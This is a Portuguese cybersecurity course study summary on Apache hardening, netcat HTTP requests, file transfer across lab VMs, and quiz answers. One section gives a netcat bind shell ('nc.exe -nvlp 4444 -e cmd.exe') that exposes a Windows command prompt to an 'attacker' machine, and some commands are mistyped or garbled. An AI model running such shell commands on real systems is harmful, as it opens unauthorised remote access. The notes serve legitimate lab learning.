# FIAP-Cyber

#### Resumo colega: https://www.notion.so/flaviovicentin/Cybersecurity-b35d9c73f60249cdb12c28dc66c0d06a

## Resumo de Comandos

### Updates/Installs
> apt install update

> apt install upgrade

> apt install apache2 apache2-utils -y

> apt install net-tools

- Iniciar o servidor:
> service apache2 start

### Notes CP01

- Entrar no diretório padrão do servidor html:
> cd /var/www/html

- Vamos renomear o index.html para copial.html:
> mv index.html copia.html

- Gerar a primeira falha de segurança no webservice:
- Vamos criar arquivos na pasta padrão do webservice e ver eles exibidos do lado do cliente:
> touch bkp.txt cadastro.php

- criar o index.html, com o editor de texto do Linux – nano, e ver o que acontece com o webservice:
> nano index.html

*RESOLVENDO PROBLEMAS DE SEGURANÇA*

1. OCULTAR AS PASTAS PARA OS CLIENTES:
> nano /etc/apache2/apache2.conf

- Remover o INDEXES para não exibir mais as pastas disponíveis para os clientes.

- Restart o webservice apache:
> service apache2 restart

- Alterar a configuração do banner no apache:
> nano /etc/apache2/conf-enabled/security.conf

- Por padrão o apache vem com o token como o Sistema Operacional (SO) deseja e a assinatura online. 
- Mas por medida de segurança, devemos alterar para o modo de Produção.:
> Trocar de "ServerTokens OS" para "ServerTokens Prod" e desligar a assinatura "ServerSignature Off"

- Subir o servidor python na porta 8080
> python3 –m http.server 8080

VER LOGs do SERVIDOR APACHE
1. No apache, ele existe o caminho padrão das pastas
> cd /var/log/apach2
ls
8. Vamos monitorar o servidor e ver como ele vai agir.
> tail –f access.log

Montando a requisição REQUEST
> nc -v 127.0.0.1 80 

> GET / HTTP/1.0 (depois dar enter)

Validação com ECHO e CURL:
> $ echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc__v_192.168.1.10 80

> $ curl -v 192.168.1.10/ijpj


### Instalação e Configuração

- Instalar o Netcat:
> apt install netcat

- Iniciar um servidor HTTP em Python na porta 8080:
> python3 -m http.server 8080

### Comandos Básicos

- Estabelecer uma conexão TCP com um host:
> nc -v 192.168.1.10 8080

- Mostrar informações detalhadas sobre as conexões:
> OPTIONS / HTTP/1.0
> GET / HTTP/1.1

- Mostrar as conexões de rede:
> netstat -nltp

### Manter Conexão com o Servidor

- Enviar uma requisição OPTIONS e manter a conexão:
> printf "OPTIONS / HTTP/1.0\r\n\r\n" | nc 192.168.1.10 80

- Verificar o IP do webserver em Python:
> ip -br -c a

### Chat Simples

- Abrir uma porta para o servidor:
> nc -lvp 1234

- Interagir com a porta do servidor:
> nc -v 192.168.1.10 1234

### Transferência de Arquivos

- Criar e enviar um arquivo do servidor para o cliente:
> echo "P4sswd" > senha.txt

> cat senha.txt | nc -lvp 1234

> nc -v 192.168.1.10 1234 > passwd.txt

- Exibir o hash MD5 do arquivo:
> md5sum senha.txt


### Transferência de Executáveis

- Transferir o arquivo nc.exe para uma máquina Windows:
> python3 -m http.server 1234

> nc -nv 192.168.1.30 4444


- Abrir uma porta no lado do cliente para executar o nc.exe e conectar à máquina do atacante:
> nc.exe -nvlp 4444 -e cmd.exe

Certifique-se de adaptar os endereços IP e portas conforme necessário para sua configuração.

### Comandos

- Criação de chat simples (servidor e cliente precisam estar na mesma rede):
> nc -lvp 1234

> nc -v 192.168.1.10 1234

- Transferir o nc.exe para uma VM Windows:
> python3 -m http.server 1234

> nc -nv 192.168.1.30 4444

### Enviar Arquivo entre Três Máquinas

Kali > VM01 > VM02

- No Kali, executar o seguinte comando no arquivo desejado:,
> nc -l -p 1234 > video.avi

- Na VM01, receber o arquivo da máquina Kali e disponibilizar para a VM02:
> nc -v 192.168.1.10 1234 | nc -l -p 4321


### Cp 03 


O que acontece se o arquivo index.html estiver ausente no diretório padrão do webservice?
>  O usuário pode navegar nas pastas e arquivos do servidor

Quais são os componentes de um sistema web?
> Clientes (browser), Servidor, Protocolo de comunicação, Página web

Quais são os métodos HTTP principais?
> GET, POST, PUT, DELETE, HEAD, OPTIONS

Qual é o diretório padrão do servidor HTML no Apache?
> b) /var/www/html

Qual é o modelo de comunicação do HTTP?
> Baseado em requisição e resposta

Os princípios básicos da segurança da informação:
> confidencialidade, integridade, disponibilidade

Qual das seguintes opções é uma característica do modelo sem estado (stateless) do HTTP?
> Cada requisição é considerada uma transação isolada

Qual comando é usado para abrir uma conexão no cliente Windows usando Netcat?
>  nc.exe -nv 192.168.1.30 4444

Como verificar se o servidor Apache está ouvindo na porta 80?
> netstat -nltp | grep 80, lsof -i :80 e netstat -nlp | grep :80

Qual comando é usado para transferir um arquivo do servidor para o cliente usando Netcat?
> cat senha.txt | nc -lvp 1234

Qual comando verifica a integridade do arquivo transferido usando md5sum?
>  md5sum senha.txt

O que é necessário fazer para evitar que os usuários naveguem pelas pastas do webservice se o arquivo index.html estiver ausente?
> Remover o INDEXES do arquivo de configuração do Apache

Qual comando é usado para monitorar o log de acessos do Apache em tempo real?
> tail -f /var/log/apache2/access.log

Como se cria um servidor HTTP usando Python na porta 8080?
> python3 -m http.server 8080

Onde estão localizados os arquivos de log padrão do servidor Apache?
>  dir /var/log/apache2

O que deve ser feito para ocultar o banner do Apache para os clientes?
> Remover o token do sistema operacional, Alterar a configuração do banner no arquivo /etc/apache2/conf-enabled/security.conf e Reiniciar o servidor Apache após a alteração

Qual comando é usado para enviar uma requisição OPTIONS para um servidor?
> printf "OPTIONS / HTTP/1.0\r\n\r\n" | nc 192.168.1.10 80

### Comunicação entre 3 computadores:

#### Passo 1: Configuração no pc03 (192.168.1.30)

O pc03 será o destino final do arquivo. Vamos começar configurando-o para receber o arquivo na porta 1234:

> nc -lvp 1234 > arquivo_passado_pelo_kali_e_debian.txt

#### Passo 2: Configuração no pc02 (192.168.1.10)

O pc02 atuará como intermediário, recebendo dados do pc01 e retransmitindo para o pc03. Para isso, configuramos o pc02 para escutar na porta 6789 e redirecionar os dados para o pc03:

> nc -lvp 6789 | nc -v 192.168.1.30 1234

#### Passo 3: Configuração no pc01 (192.168.1.20)

O pc01 será o responsável por enviar o arquivo. Usaremos o cat para ler o arquivo e o nc para enviar os dados ao pc02::

> cat arquivo.txt | nc -v 192.168.1.10 6789




